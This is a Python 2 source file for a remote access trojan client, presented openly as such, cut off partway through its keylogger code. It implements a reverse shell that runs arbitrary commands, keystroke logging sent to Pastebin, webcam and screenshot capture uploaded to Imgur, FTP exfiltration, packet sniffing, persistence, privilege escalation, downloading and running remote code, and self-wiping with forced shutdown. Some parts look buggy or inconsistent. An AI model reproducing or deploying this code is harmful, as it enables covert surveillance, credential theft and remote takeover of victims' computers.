#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright (c) 2017 Daniel Vega-Myhre
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

'''  

        ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
        ""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
        ,adPPPPP88 88       88 8b       88 88	       8b	88
        88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
        `"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
                                aa,    ,88 	        aa,    ,88
                                 "Y8bbdP"          	 "Y8bbdP'

                                                       88                          ,d
                                                       88                          88
         ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
        a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
        8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
        "8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
         `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
                    aa,    ,88  aa,    ,88 88                                      "Y888
                     "Y8bbdP"    "Y8bbdP"  88

'''

import os
import sys
import time
import json
import struct
import socket
import requests
import tempfile
import threading
import subprocess
from mss import mss
from uuid import uuid1
from ftplib import FTP
from random import choice
from platform import uname
from imp import new_module
from zipfile import ZipFile
from logging import getLogger
from urllib import urlretrieve
from base64 import b64encode, b64decode
from logging.handlers import SocketHandler
if os.name is 'nt':
    from ctypes import windll
    from pyHook import HookManager
    from pythoncom import PumpMessages
    from win32com.shell.shell import ShellExecuteEx
    from _winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_WRITE
    from cv2 import VideoCapture, VideoWriter, VideoWriter_fourcc, imwrite, waitKey
else:
    from pyxhook import HookManager



class Client(object):
    
    global __modules__
    global __command__

    __command__ = {}
    __modules__ = {}

    def __init__(self, **kwargs):
        self._setup(**kwargs)
        self._exit      = 0
        self._threads   = {}
        self._info      = self._get_info()
        self._logger    = self._get_logger()
        self._modules   = {mod: getattr(self, mod) for mod in __modules__}
        self._commands  = {cmd: getattr(self, cmd) for cmd in __command__}
        self._result    = {mod: dict({}) for mod in self._modules}

    # ------------------ commands --------------------------
    def command(fx, cx=__command__, mx=__modules__):
        fx.status        = threading.Event()
        if fx.func_name is 'persistence':
            fx.platforms = ['win32','darwin']
            fx.options   = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
            fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'keylogger':
            fx.platforms = ['win32','darwin','linux2']
            fx.options   = {'max_bytes': 1024, 'buffer': None, 'window': None}
            fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'webcam':
            fx.platforms = ['win32']
            fx.options   = {'image': True, 'video': bool()}
            fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'packetsniff':
            fx.platforms = ['darwin','linux2']
            fx.options   = { 'capture':[], 'seconds': 300.0}
            fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'screenshot':
            fx.platforms = ['win32','linux2','darwin']
            fx.options   = {}
            fx.status.set() if sys.platform in fx.platforms else fx.status.clear()
            mx.update({fx.func_name: fx})
        elif fx.func_name is 'upload':
            fx.options   = {'pastebin': {'api_key': None}, 'imgur': {'api_key': None}, 'ftp': {'host': None, 'username': None, 'password': None}}
            fx.status.set()
            cx.update({fx.func_name: fx})
        elif fx.func_name is 'encryption':
            fx.options   = {'block_size': 8, 'key_size': 16, 'num_rounds': 32, 'hash_algo': 'md5'}
            fx.status.set()
        elif fx.func_name is 'standby':
            fx.options   = {'next_run': None}
            fx.status.clear()
            cx.update({fx.func_name: fx})
        elif fx.func_name is 'shell':
            fx.options   = {}
            fx.status.set()
            cx.update({fx.func_name: fx})
        else:
            cx.update({fx.func_name: fx})
        return fx

    @command
    def shell(self):
        """\tremotely pop a reverse-shell on client machine"""
        return self._shell()

    @command
    def standby(self):
        """1. run enabled modules 2. log results 3.sleep 4. repeat"""
        return self._standby()
    
    @command
    def cd(self, *x):
        """change directory"""
        return self._cd(*x)

    @command
    def set(self, x):
        """set module options"""
        return self._set(x)

    @command
    def ls(self, x='.'):
        """list directory contents"""
        return self._ls(x)

    @command
    def pwd(self):
        """\tpresent working directory"""
        return os.getcwd()

    @command
    def cat(self, *x):
        """display file contents"""
        return self._cat(*x)

    @command
    def run(self):
        """\trun enabled client modules"""
        return self._run()

    @command
    def new(self, url):
        """download new module from url"""
        return self._new(url)

    @command
    def kill(self):
        """\tkill client and wipe"""
        return self._kill()
    
    @command
    def show(self, x):
        """show client attributes"""
        return self._show(x)

    @command
    def wget(self, url):
        """download file from url"""
        return self._wget(url)

    @command
    def jobs(self):
        """\tlist currently active jobs"""
        return self._show(self._threads)

    @command
    def help(self, *args):
        """show command usage information"""
        return self._help(*args)

    @command
    def info(self):
        """\tget client host machine information"""
        return self._show(self._info)

    @command
    def admin(self):
        """\tattempt to escalate privileges"""
        return self._admin()
    
    @command
    def upload(self, *args):
        """remotely upload file - imgur/pastebin/ftp"""
        return self._upload(*args)

    @command
    def enable(self, *modules):
        """enable module(s)"""
        return self._enable(*modules)

    @command
    def options(self, x=None):
        """display module options"""
        return self._options(x) if x else self._options()

    @command
    def status(self):
        """\tget client session status"""
        return self._status(time.clock())

    @command
    def disable(self, *modules):
        """disable module(s)"""
        return self._disable(*modules)

    @command
    def results(self):
        """show all modules results"""
        return self._show(self._result)

    @command
    def modules(self):
        """list modules current status"""
        return self._help_modules()

    @command
    def webcam(self):
        """\tcapture client webcam - upload to imgur"""
        return self._webcam()
    
    @command
    def keylogger(self):
        """log client keystrokes remotely - dump to pastebin"""
        return self._keylogger()

    @command
    def screenshot(self):
        """take screenshot and upload to imgur"""
        return self._screenshot()

    @command
    def persistence(self):
        """establish persistence - prevent removal"""
        return self._persistence()
    
    @command
    def packetsniff(self):
        """capture network traffic and dump to pastebin"""
        return self._packetsniff()

    @command
    def encryption(self, *option):
        """encryption <on/off> - default: on"""
        pass


    ls.usage            = 'ls <path>'
    wget.usage          = 'wget <url>'
    cd.usage            = 'cd <path>'
    new.usage           = 'new <url>'
    cat.usage           = 'cat <file>'
    set.usage           = 'set <cmd> x=y'
    help.usage          = 'help <option>'
    show.usage          = 'show <option>'
    disable.usage       = 'disable <cmd>'
    enable.usage        = 'enable <cmd>'
    upload.usage        = '[mode] [file]'
    options.usage       = 'options <cmd>'
    pwd.usage           = 'pwd'
    run.usage           = 'run'
    kill.usage          = 'kill'
    info.usage          = 'info'
    jobs.usage          = 'jobs'
    admin.usage         = 'admin'
    shell.usage         = 'shell'
    webcam.usage        = 'webcam'
    status.usage        = 'status'
    results.usage       = 'results'
    standby.usage       = 'standby'
    modules.usage       = 'modules'
    keylogger.usage     = 'keylogger'
    screenshot.usage    = 'screenshot'
    persistence.usage   = 'persistence'
    packetsniff.usage   = 'packetsniff'

    # ------------------- private functions -------------------------

    def _help(self, *arg): return '\n ' + '\n '.join(['{}\t\t{}'.format(i.usage, i.func_doc) for i in self._commands.values()])

    def _help_command(self, cmd): return getattr(self, cmd).func_doc if cmd in self._commands else "'{}' not found".format(cmd)
    
    def _help_modules(self): return '\n'.join(['{:>12}{:>13}'.format(mod, ('enabled' if self._modules[mod].status.is_set() else 'disabled')) for mod in self._modules])
    
    def _wget(self, target): return urlretrieve(target)[0] if target.startswith('http') else 'Error: target URL must begin with http:// or https://'
    
    def _cat(self, *path): return open(path[0]).read(4000) if os.path.isfile(path[0]) else 'Error: file not found'
    
    def _unzip(self, *path): return ZipFile(*path).extractall('.') if os.path.isfile(path[0]) else 'Error: file not found'
    
    def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')

    def _pad(self, s): return s + (self.encryption.options['block_size'] - len(bytes(s)) % self.encryption.options['block_size']) * '\x00'

    def _block(self, s): return [s[i * self.encryption.options['block_size']:((i + 1) * self.encryption.options['block_size'])] for i in range(len(s) // self.encryption.options['block_size'])]

    def _xor(self, s, t): return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(s, t))

    def _ls(self, path): return '\n'.join(os.listdir(path)) if os.path.isdir(path) else '\n'.join(os.listdir('.'))

    def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs]

    def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [os.getenv('USER', os.getenv('USERNAME')), os.getenv('NAME', os.getenv('COMPUTERNAME')), '{}-bit'.format(struct.calcsize('P') * 8), requests.get('http://api.ipify.org').content, socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}

    def _get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
  
    def _status(self,c=None): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0)) if not c else '%d days, %d hours, %d minutes, %d seconds' % (int(c/86400.0), int((c%86400.0)/3600.0), int((c%3600.0)/60.0), int(c%60.0))

    def _long_to_bytes(self, x):
        try:
            return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print "Long-to-bytes conversion error: {}".format(str(e))

    def _bytes_to_long(self, x):
        try:
            return long(bytes(x).encode('hex'), 16)
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print "Bytes-to-long conversion error: {}".format(str(e))            

    def _screenshot(self):
        tmp = tempfile.mktemp(suffix='.png')
        with mss() as screen:
            img = screen.shot(output=tmp)
        result = self._upload_imgur(img)
        self._result['screenshot'].update({ time.ctime() : result })
        if self.standby.status.is_set():
            self._logger.log(40, result, extra={'submodule': 'screenshot'})
        return result


    def _keylogger(self):
        self._threads['keylogger'] = threading.Thread(target=self._keylogger_manager, name='keylogger')
        self._threads['keylogger'].start()
        result = 'Keylogger started at {}'.format(time.ctime())
        self._result['keylogger'].update({ time.ctime() : result })
        if self.standby.status.is_set():
            self._logger.log(40, result, extra={'submodule': 'keylogger'})
        return result

    def _webcam(self):
        if self.webcam.options['video']:
            if 'video' not in self._result['webcam']:
                self._result['webcam'].update({'video': {}})
            result = self._webcam_video()
            self._result['webcam']['video'][time.ctime()] = result
        else:
            if 'image' not in self._result['webcam']:
                self._result['webcam'].update({'image': {}})
            result = self._webcam_image()
            self._result['webcam']['image'][time.ctime()] = result
        if self.standby.status.is_set():
            self._logger.log(40, result, extra={'submodule': 'webcam'})
        return result

    def _packetsniff(self):
        try:
            result  = self._packetsniff_manager(float(self.packetsniff.options['duration']))
        except Exception as e:
            result  = 'Error monitoring network traffic: {}'.format(str(e))
        self._result['packetsniff'].update({ time.ctime() : result })
        if self.standby.status.is_set():
            self._logger.log(40, result, extra={'submodule': 'packetsniffer'})
        return result

    def _hidden_process(self, path, shell=False):
        info = subprocess.STARTUPINFO()
        info.dwFlags = subprocess.STARTF_USESHOWWINDOW|subprocess.CREATE_NEW_PROCESS_GROUP
        info.wShowWindow = subprocess.SW_HIDE
        p = subprocess.Popen(path, startupinfo=info)
        return p

    def _target(self):
        if '__a__' in vars(self) and '__b__' in vars(self):
            try:
                ab = requests.get(self._long_to_bytes(long(self.__a__)), headers={'API-Key': self._long_to_bytes(long(self.__b__))}).json()
                cd = ab[ab.keys()[0]][0].get('ip')
                if requests.utils.is_ipv4_address(cd):
                    return cd
                else:
                    if '__v__' in vars(self) and self.__v__:
                        print 'Target error: invalid response from server'
                time.sleep(10)
                return self._target()
            except Exception as e:
                if '__v__' in vars(self) and self.__v__:
                    print 'Target error: {}'.format(str(e))
        else:
            return 'localhost'
    
    def _connect(self, port=1337):
        h = self._target()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('localhost', port))
            return s
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Connection error: {}'.format(str(e))
        time.sleep(10)
        return self._connect(h, port)

    def _send(self, data, method='default'):
        try:
            block = data[:4096]
            data  = data[len(block):]
            ciphertext  = self._encrypt(block) if self.encrypt.status.is_set() else block
            msg = '{}:{}\n'.format(method, ciphertext)
            try:
                self._socket.sendall(msg)
            except socket.error: return
            if len(data):
                return self._send(data, method)
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Send error: {}'.format(str(e))

    def _receive(self):
        try:
            data = ""
            self._socket.setblocking(False) if self.standby.status.is_set() else self._socket.setblocking(True)
            while "\n" not in data:
                try:
                    data += self._socket.recv(1024)
                except socket.error: return
            data = self._decrypt(data.rstrip()) if len(data) else data
            return data
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Receive error: {}'.format(str(e))

    def _diffiehellman(self, bits=2048):
        try:
            p = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            g = 2
            a = self._bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            self._socket.sendall(self._long_to_bytes(xA))
            xB = self._bytes_to_long(self._socket.recv(256))
            x = pow(xB, a, p)
            return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), string=self._long_to_bytes(x)).digest()
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Diffie-Hellman transaction-less key-exchange failed with error: {}'.format(str(e))

    def _encryption(self, block):
        try:
            endian = '<' if sys.byteorder == 'little' else '!'
            v0, v1 = struct.unpack(endian + "2L", block)
            k = struct.unpack(endian + "4L", self._dhkey)
            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for round in range(self.encryption.options['rounds']):
                v0 = (v0 + (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
                sum = (sum + delta) & mask
                v1 = (v1 + (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
            return struct.pack(endian + "2L", v0, v1)
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Encryption error: {}'.format(str(e))

    def _decryption(self, block):
        try:
            endian = '<' if sys.byteorder == 'little' else '!'
            v0, v1 = struct.unpack(endian +"2L", block)
            k = struct.unpack(endian + "4L", self._dhkey)
            delta, mask = 0x9e3779b9L, 0xffffffffL
            sum = (delta * self.encryption.options['rounds']) & mask
            for round in range(self.encryption.options['rounds']):
                v1 = (v1 - (((v0<<4 ^ v0>>5) + v0) ^ (sum + k[sum>>11 & 3]))) & mask
                sum = (sum - delta) & mask
                v0 = (v0 - (((v1<<4 ^ v1>>5) + v1) ^ (sum + k[sum & 3]))) & mask
            return struct.pack(endian + "2L", v0, v1)
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Decryption error: {}'.format(str(e))

    def _encrypt(self, data):
        padded = self._pad(data)
        blocks = self._block(padded)
        vector = os.urandom(8)
        result = [vector]
        for block in blocks:
            encode = self._xor(vector, block)
            output = vector = self._encryption(encode)
            result.append(output)
        return b64encode(''.join(result))
    
    def _decrypt(self, data):
        blocks = self._block(b64decode(data))
        result = []
        vector = blocks[0]
        for block in blocks[1:]:
            decode  = self._decryption(block)
            output  = self._xor(vector, decode)
            vector = block
            result.append(output)
        return ''.join(result).rstrip('\x00')

    def _shutdown(self):
        try:
            _ = os.popen('shutdown /d 1 /f').read() if os.name is 'nt' else os.popen('shutdown -h now').read()
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Shutdown error: {}'.format(str(e))

    def _enable(self, *targets):
        output = []
        for target in [_ for _ in targets if hasattr(self, _)]:
            try:
                getattr(self, target).im_func.status.set()
                output.append(target)
            except Exception as e:
                return "Enable '{}' returned error: '{}'".format(target, str(e))
        return 'Enabled: , '.join(output)

    def _disable(self, *targets):
        output = []
        for target in [_ for _ in targets if hasattr(self, _)]:
            try:
                getattr(self, target).im_func.status.clear()
                output.append(target)
            except Exception as e:
                return "Disable '{}' returned error: '{}'".format(target, str(e))
        return 'Disabled: , '.join(output)

    def _set(self, arg):
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if target not in self._modules:
                return "Target '{}' not found".format(target)
            if option not in getattr(self, target).options:
                return "Option '{}' not found for target '{}'".format(option, target)
            if str(val).isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.lower() in ('true', 'on'):
                val = True
            elif val.lower() in ('false', 'off'):
                val = False
            elif str(val).isdigit():
                val = int(val)
            else:
                val = str(val)
            getattr(self, target).options[option] = val
        except Exception as e:
            return "'Command: '{}' with arguments '{}' returned error: '{}'".format(self.set.func_name, arg, str(e))
        return target.title() + '\n\t' + '\n\t'.join(['{}\t\t{}'.format(option, value) for option, value in self._modules[target].options.items()])

    def _options(self, target=None):
        try:
            output = []
            if not target:
                output.append('Encryption')
                for key,val in self.encryption.options.items():
                    output.append('{:>15} {:>13}'.format(str(key), str(val)))
                for target in self._modules:
                    output.append(str(target).title())
                    for option,value in getattr(self, target).options.items():
                        output.append('{:>15} {:>13}'.format(option, str(value)))
            else:
                if not hasattr(self, target):
                   return "'{}' not found".format(target)
                elif not hasattr(getattr(self, target), 'options'):
                    return "No options found for '{}'".format(target)
                else:
                    output.append(str(target).title())
                    for option,value in getattr(self, target).options.items():
                        output.append('{:>15} {:>13}'.format(option, str(value)))
            return '\n'.join(output)
        except Exception as e:
            return 'Option error: {}'.format(str(e))
            
    def _show(self, target):
        try:
            results = json.dumps(target, indent=2, separators=(',','\t'), sort_keys=True)
        except:
            try:
                string_repr = repr(target)
                string_repr = string_repr.replace('None', 'null').replace('True', 'true').replace('False', 'false').replace("u'", "'").replace("'", '"')
                string_repr = re.sub(r':(\s+)(<[^>]+>)', r':\1"\2"', string_repr)
                string_repr = string_repr.replace('(', '[').replace(')', ']')
                results     = json.dumps(json.loads(string_repr), indent=2, separators=(',', '\t'), sort_keys=True)
            except:
                results = repr(target)
        return results

    def _ip(self):
        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
        for target in sources:
            try:
                ip = requests.get(target).content
                if socket.inet_aton(ip):
                    return ip
            except: pass

    def _admin(self):
        info = self._get_info()
        if info['Admin']:
            return {'User': info['login'], 'Administrator': info['admin']}
        if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
            if os.name is 'nt':
                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._long_to_bytes(long(self.__f__))))
            else:
                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)

    def _new(self, args):
        if ' ' in args and args.split()[0] in ('module','update') and args.split()[1].startswith('http'):
            action = args.split()[0]
            target = args.split()[1]
            try:
                module = self._new_module(target)
            except Exception as e:
                return "Error creating new module: '{}'".format(str(e))
            if action == 'module':
                return "New module '{}' successfully created".format(str(module.__name__))
            elif action == 'update':
                exec module in globals()
        else:
            return self.new.func_doc

    def _new_module(self, uri, *kwargs):
        try:
            name    = os.path.splitext(os.path.basename(uri))[0] if 'name' not in kwargs else str(kwargs.get('name'))
            module  = new_module(name)
            source  = requests.get(uri).content
            code    = compile(source, name, 'exec')
            exec code in module.__dict__
            self._modules[name] = module
            return module
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print "Error creating module: {}".format(str(e))

    def _powershell(self, cmdline):
        try:
            cmds = cmdline if type(cmdline) is list else str(cmdline).split()
            info = subprocess.STARTUPINFO()
            info.dwFlags = subprocess.STARTF_USESHOWWINDOW
            info.wShowWindow = subprocess.SW_HIDE
            command=['powershell.exe', '/c', cmds]
            p = subprocess.Popen(command, startupinfo=info, stderr=subprocess.STDOUT, stdout=subprocess.PIPE, universal_newlines=True)
            results, _ = p.communicate()
            return results
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print 'Powershell error: {}'.format(str(e))

    def _get_logger(self, port=4321):
        module_logger   = getLogger(self._ip())
        module_logger.handlers = []
        module_handler  = SocketHandler(self._target(), port)
        module_logger.addHandler(module_handler)
        return module_logger

    def _upload_imgur(self, filename, override=False):
        if not self.upload.status.is_set() and not override:
            return filename
        if not self.upload.options['imgur'].get('api_key'):
            return "Error: no api key found"
        api_key  = self.upload.options['imgur'].get('api_key')
        try:
            with open(filename, 'rb') as fp:
                data = b64encode(fp.read())
            os.remove(filename)
            result = requests.post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': data, 'type': 'base64'}).json().get('data').get('link')
        except Exception as e:
            result = str(e)
        return result

    def _upload_pastebin(self, path, override=False):
        info = {'api_option': 'paste'}
        if not self.upload.status.is_set() and not override:
            return path
        if self.upload.options['pastebin'].get('api_key'):
            info['api_dev_key']  = self.upload.options['pastebin'].get('api_key')
        else:
            return "Error: no api key found"
        if self.upload.options.get('user_key'):
            info['api_user_key'] = self.upload.options['pastebin'].get('user_key')
        try:
            with open(path, 'r') as fp:
                info['api_paste_code'] = fp.read()
            result = requests.post('https://pastebin.com/api/api_post.php', data=info).content
        except Exception as e:
            result = str(e)
        return result
     
    def _upload_ftp(self, filepath, override=False):
        if not self.upload.status and not override:
            return filepath
        if not self.upload.options['ftp'].get('host') or not self.upload.options['ftp'].get('username') or not self.upload.options['ftp'].get('password'):
            return 'Error: missing host/username/password'
        try:
            host =  FTP(self.upload.options['ftp'].get('host'), self.upload.options['ftp'].get('username'), self.upload.options['ftp'].get('password'))
        except Exception as e:
            return 'FTP error: {}'.format(str(e))
        try:
            if self._info.get('IP Address') not in host.nlst('/htdocs'):
                host.mkd('/htdocs/{}'.format(self._info.get('IP Address')))
            result = '/htdocs/{}/{}'.format(self._info.get('IP Address'), os.path.basename(filepath))
            upload = host.storbinary('STOR ' + result, open(filepath, 'rb'))
        except Exception as e:
            result = str(e)
        return result

    def _upload(self, *args):
        if len(args) != 2:
            return self.upload.usage
        mode = args[0]
        target = args[1]
        if not type(target) is str:
            return "Error: invalid data type for argument 'target': expected '{}', got '{}'".format(str, type(target))
        if mode not in self.upload.options:
            return "Error: invalid value '{}' for argument 'mode'".format(mode)
        if not len(target):
            return "Error: invalid value '{}' for argument 'target'".format(target)
        try:
            return getattr(self, '_upload_{}'.format(mode, override=True))(target)
        except Exception as e:
            return 'Upload error: {}'.format(str(e))

    def _run(self):
        tasks = []
        for name, module in self._modules.items():
             if module.status.is_set() and sys.platform in module.platforms:
                self._threads[name] = threading.Thread(target=module, name=name)
                self._threads[name].daemon = True
                tasks.append(name)
        for task in tasks:
            self._threads[task].start()
        for task, worker in self._threads.items():
            if task not in ('keylogger','packetsniff','encryption') and worker.is_alive():
                worker.join()
                _ = self._threads.pop(task, None)
        return self._show(self._result)

    def _shell(self):
        self.standby.status.clear()
        self.shell.status.set()
        self._threads['shell'] = threading.Thread(target=self._reverse_shell, name='shell')
        self._threads['shell'].start()

    def _reverse_shell(self):
        while True:
            self.shell.status.wait()
            prompt = "[%d @ {}]> ".format(os.getcwd())
            self._send(prompt, method='prompt')   
            data = self._receive()
            cmd, _, action = bytes(data).partition(' ')
            if cmd in self._commands:
                result = self._commands[cmd](action) if len(action) else self._commands[cmd]()
            else:
                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            if result and len(result):
                result = '\n' + str(result) + '\n'
                self._send(result, method=cmd)

    def _standby(self):
        self.shell.status.clear()
        self.standby.status.set()
        self.standby.options['next_run'] = time.ctime(time.time() + 300.0)
        self.threads['standby'] = threading.Thread(target=self._standby_mode, name='standby')
        self.threads['standby'].start()
        self._send('Standing by - next run at {}'.format(self.standby.options['next_run']))

    def _standby_mode(self):
        while True:
            self.standby.status.wait()
            b = self._receive()
            if b and len(b):
                self.standby.status.clear()
                self.shell.status.set()
                break
            elif time.time() > time.mktime(time.strptime(self.standby.options['next_run'])):
                try:
                    _ = self._run()
                    status = 'status - standing by'.format(self._info.get('IP Address'))
                except Exception as e:
                    status = 'status - error: {}'.format(str(e))
                self._logger.log(40, status, extra={'submodule':'standby'})
                self.standby.options['next_run'] = time.ctime(time.mktime(time.strptime(self.standby.options['next_run'])) + 300.0)
            else:
                time.sleep(1)
        return self.shell()

    def _start(self):
        try:
            self.upload.options['pastebin']['api_key']  = self._long_to_bytes(long(self.__d__)) if '__d__' in vars(self) else None
            self.upload.options['pastebin']['user_key'] = self._long_to_bytes(long(self.__c__)) if '__c__' in vars(self) else None
            self.upload.options['imgur']['api_key']     = self._long_to_bytes(long(self.__e__)) if '__e__' in vars(self) else None
            self.upload.options['ftp']['host']          = self._long_to_bytes(long(self.__q__)).split()[0] if ('__q__' in vars(self) and len(self._long_to_bytes(long(self.__q__)).split()) == 3) else None
            self.upload.options['ftp']['username']      = self._long_to_bytes(long(self.__q__)).split()[1] if ('__q__' in vars(self) and len(self._long_to_bytes(long(self.__q__)).split()) == 3) else None
            self.upload.options['ftp']['password']      = self._long_to_bytes(long(self.__q__)).split()[2] if ('__q__' in vars(self) and len(self._long_to_bytes(long(self.__q__)).split()) == 3) else None
            self._socket                                = self._connect()
            self._dhkey                                 = self._diffiehellman()
            self._threads['shell']                      = threading.Thread(target=self._shell, name='shell')
            self._threads['shell'].start()
            self.shell.status.set()
            self.standby.status.clear()
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print "Error: '{}'".format(str(e))

    def _kill(self):
        try:
            self._exit = True
            for method in self.persistence.options:
                try:
                    target = 'persistence_remove_{}_{}'.format(*method.split())
                    getattr(self, target)()
                except Exception as e2:
                    if '__v__' in vars(self) and self.__v__:
                        print 'Error removing persistence: {}'.format(str(e2))
            try:
                self._socket.close()
            except: pass
            try:
                if hasattr(self, '__f__') and os.path.isfile(self._long_to_bytes(long(self.__f__))):
                    os.remove(self.__f__)
                if '__file__' in globals():
                    os.remove(__file__)
            except: pass
            for i in self._threads:
                try:
                    t = self._threads.pop(i, None)
                    del t
                except: pass
        finally:
            shutdown = threading.Timer(1, self._shutdown)
            shutdown.start()
            exit(0)

    # ------------------- keylogger -------------------------

    def _keylogger_event(self, event):
        if event.WindowName != self.keylogger.options['window']:
            self.keylogger.options['window'] = event.WindowName
            self.keylogger.options['buffer'].write("\n[{}]\n".format(self.keylogger.options['window']))
        if event.Ascii > 32 and event.Ascii < 127:
            self.keylogger.options['buffer'].write(chr(event.Ascii))
        elif event.Ascii == 32:
            self.keylogger.options['buffer'].write(' ')
        elif event.Ascii in (10,13):
            self.keylogger.options['buffer'].write('\n')
        elif event.Ascii == 8:
            self.keylogger.options['buffer'] = self.keylogger.options['buffer'].seek(self.keylogger.options['buffer'].tell() - 1)
            self.keylogger.options['buffer'].truncate()
        else:
            pass
        return True
        
    def _keylogger_helper(self):
        try:
            mb = int(self.keylogger.options['max_bytes'])
        except Exception as e:
            if '__v__' in vars(self) and self.__v__:
                print "Keylogger helper function error: {}".format(str(e))
        self.keylogger.options['buffer'] = tempfile.SpooledTemporaryFile(max_bytes=mb, suffix='.txt', delete=False)
        while True:
            if self.exit or self.keylogger.options['buffer']._rolled:
                break
            else:
                time.sleep(5)
        result = self._upload_pastebin(self.keylogger.options['buffer'].name)
        self._result.update({time.ctime(): result})
        if self.keylogger.status.is_set():
            self._logger.log(40, result, extra={'submodule': 'keylogger'})
        try:
            os.remove(self.keylogger.options['buffer'].name)
        except: pass
        if self.exit:
            return
        return self._keylogger_helper()
                
    def _keylogger_manager(self):
